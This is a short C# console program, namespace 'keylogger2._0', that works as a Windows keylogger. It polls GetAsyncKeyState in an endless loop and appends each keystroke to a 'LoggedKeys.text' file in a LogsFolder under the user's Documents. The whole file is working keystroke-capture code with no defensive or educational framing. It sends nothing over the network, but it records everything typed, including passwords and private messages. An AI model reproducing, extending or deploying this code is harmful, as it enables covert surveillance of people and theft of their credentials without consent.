﻿using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace keylogger2._0
{
    class Program
    {
        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            LogKeys();
        }

        static void LogKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            filepath = filepath + @"\LogsFolder\";

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (@filepath + "LoggedKeys.text");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
                //end
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (5 > 1)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;
                    }
                }
            }

        }
    }
}
